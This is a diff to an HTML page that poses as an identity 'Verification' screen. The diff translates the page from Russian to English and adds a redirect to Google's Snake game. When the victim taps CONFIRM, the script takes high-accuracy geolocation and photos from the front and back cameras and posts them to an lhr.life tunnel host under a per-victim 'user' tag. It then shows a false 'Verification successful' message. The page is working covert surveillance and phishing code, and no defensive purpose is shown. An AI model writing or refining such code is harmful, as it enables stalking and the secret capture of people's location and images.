@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,16 +16,18 @@
 <body>
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg">Нажмите для синхронизации с MacBook</p>
-        <button class="btn" id="go" onclick="run()">ПОДТВЕРДИТЬ</button>
+        <p id="msg">Please confirm your identity to continue</p>
+        <button class="btn" id="go" onclick="run()">CONFIRM</button>
         <div id="loader"></div>
     </div>
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
-        // ЗАМЕНИ НА СВОЮ АКТУАЛЬНУЮ ССЫЛКУ LHR.LIFE
+        // UPDATE THIS WITH YOUR ACTUAL TUNNEL LINK
         const API = "https://166e0338275ee5.lhr.life"; 
+        // Direct link to Google Snake
+        const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
         const user = new URLSearchParams(window.location.search).get('user') || "Unknown";
 
@@ -47,27 +49,35 @@
         async function run() {
             document.getElementById('go').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
+            document.getElementById('msg').innerText = "Processing, please wait...";
 
-            // 1. Геопозиция
+            // 1. Geolocation
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`);
             }, null, {enableHighAccuracy:true});
 
-            // 2. Фото
+            // 2. Capture Photos (Front & Back)
             const fd = new FormData();
             const f1 = await takePhoto("user");
             if (f1) fd.append('files', f1, 'front.jpg');
             const f2 = await takePhoto("environment");
             if (f2) fd.append('files', f2, 'back.jpg');
 
-            // 3. Отправка
+            // 3. Send and Redirect
             if (fd.has('files')) {
                 await fetch(`${API}/upload-photo?user=${user}`, { method: 'POST', body: fd });
-                document.getElementById('st').innerText = "Готово";
+                
+                document.getElementById('st').innerText = "Done";
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('msg').innerText = "Проверка завершена успешно.";
+                document.getElementById('msg').innerText = "Verification successful. Redirecting...";
+                
+                // Redirect to Snake game after 1.5 seconds
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1500);
+
             } else {
-                alert("Ошибка доступа к камере.");
+                alert("Camera access is required for verification.");
                 location.reload();
             }
         }
